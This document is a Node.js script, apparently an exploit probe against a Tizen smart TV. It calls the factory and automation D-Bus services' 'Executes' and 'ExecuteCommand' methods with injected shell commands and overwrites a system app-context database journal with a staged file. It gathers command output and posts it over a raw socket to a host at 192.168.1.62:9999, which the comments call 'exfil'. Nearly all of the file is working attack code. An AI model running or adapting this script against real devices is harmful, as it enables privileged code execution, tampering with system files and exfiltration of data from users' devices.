"use strict";

/* p69: factory Executes / automation ExecuteCommand marker test + Probe10 diagnosis
   A. raw XML /TIFacSerObj (factory) + /TIFacAutoObj (automation)
   B. for target method: parse ENCLOSING interface name + in-args; if first arg 's' -> call with marker cmd
   C. Probe10 diag: apps_rw/ProbeTenio mtimes + get_current_showing_app
   D. wait 20s (marker settle) + read markers + verify DST/LIVE
   exfil /p69info
 */

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var MARKDIR = '/home/owner/share/tmp/sdk_tools';
var R = { ts: new Date().toISOString(), probe: 'p69', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(120000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p69info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

/* find the <interface name="..."> that encloses a method, + its in-args in order */
function parseMethod(xml, methodName) {
  var s = String(xml);
  var mStart = s.match(new RegExp('<method name\\s*=\\s*["\']' + methodName + '["\']'));
  if (!mStart) return null;
  var idx = mStart.index;
  var before = s.substring(0, idx);
  var ifIdx = before.lastIndexOf('<interface name');
  if (ifIdx < 0) return null;
  var ifm = before.substring(ifIdx).match(/<interface name\s*=\s*['"]([^'"]+)['"]/);
  if (!ifm) return null;
  var block = s.substring(idx);
  var end = block.indexOf('</method>');
  if (end < 0) return null;
  block = block.substring(0, end);
  var args = [];
  var are = /<arg type\s*=\s*['"]([^'"]+)['"] name\s*=\s*['"]([^'"]+)['"] direction\s*=\s*['"]in['"]/g;
  var am;
  while ((am = are.exec(block)) !== null) args.push({ type: am[1], name: am[2] });
  return { iface: ifm[1], args: args };
}

function callWithMarker(dest, path, method, mk) {
  var inner = 'date > ' + mk + ' 2>&1; whoami >> ' + mk + ' 2>&1; id >> ' + mk + ' 2>&1; ' +
    'cp ' + STAGED + ' ' + DST + ' >> ' + mk + ' 2>&1; ' +
    'md5sum ' + DST + ' >> ' + mk + ' 2>&1; ' +
    'ls -la ' + DST + ' >> ' + mk + ' 2>&1; echo END >> ' + mk;
  var dbusArg = 'string:"sh -c ' + "'" + inner + "'" + '"';
  return run('dbus-send --system --print-reply --dest=' + dest + ' --type=method_call ' + path + ' ' + method + ' ' + dbusArg + ' 2>&1 | head -12', 45000);
}

function main() {
  /* ---------- A. raw XML ---------- */
  R.results.a1_factory = run('dbus-send --system --print-reply --dest=org.tizen.tv.factory-service /TIFacSerObj org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 16000);
  R.results.a2_automation = run('dbus-send --system --print-reply --dest=org.tizen.tv.automation-service /TIFacAutoObj org.freedesktop.DBus.Introspectable.Introspect 2>&1', 30000, 16000);

  /* ---------- B. marker calls ---------- */
  var fac = parseMethod(R.results.a1_factory, 'Executes');
  R.results.b0_executes = JSON.stringify(fac);
  if (fac && fac.args.length > 0 && fac.args[0].type === 's') {
    R.results.b1_executes_out = callWithMarker('org.tizen.tv.factory-service', '/TIFacSerObj', fac.iface + '.Executes', MARKDIR + '/fac_m1.txt');
  } else {
    R.results.b1_executes_out = 'Executes not callable: ' + JSON.stringify(fac);
  }

  var auto = parseMethod(R.results.a2_automation, 'ExecuteCommand');
  R.results.b2_execute_command = JSON.stringify(auto);
  if (auto && auto.args.length > 0 && auto.args[0].type === 's') {
    R.results.b3_execute_command_out = callWithMarker('org.tizen.tv.automation-service', '/TIFacAutoObj', auto.iface + '.ExecuteCommand', MARKDIR + '/auto_m1.txt');
  } else {
    R.results.b3_execute_command_out = 'ExecuteCommand not callable: ' + JSON.stringify(auto);
  }

  /* ---------- C. Probe10 diagnosis ---------- */
  R.results.c1_appdir = run('ls -la /opt/usr/home/owner/apps_rw/ProbeTenio/ 2>&1 | head -25; echo ===LOCAL; ls -la /opt/usr/home/owner/apps_rw/ProbeTenio/.local_share/ 2>&1 | head -15; echo ===APPS; ls -la /opt/usr/home/owner/apps_rw/ProbeTenio/.local_share/apps/ 2>&1 | head -15', 20000);
  R.results.c2_showing = run('dbus-send --system --print-reply --dest=org.tizen.tv.litewebappservice.server --type=method_call /org/tizen/tv/litewebappservice/server org.tizen.tv.litewebappservice.server.interface.get_current_showing_app 2>&1 | head -8', 30000);

  /* ---------- D. wait + markers + verify ---------- */
  try { cp.execSync('sleep 20', { timeout: 40000, maxBuffer: 4096 }); } catch (e) {}
  R.results.d1_markers = run('echo === FAC; ls -la ' + MARKDIR + '/fac_m1.txt 2>&1; cat ' + MARKDIR + '/fac_m1.txt 2>&1; echo === AUTO; ls -la ' + MARKDIR + '/auto_m1.txt 2>&1; cat ' + MARKDIR + '/auto_m1.txt 2>&1', 15000);
  R.results.d2_verify = run('echo ===DST; ls -la ' + DST + ' 2>&1; md5sum ' + DST + ' 2>&1; echo ===LIVE; md5sum ' + LIVE + ' 2>&1; echo ===STAGED; md5sum ' + STAGED + ' 2>&1', 20000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
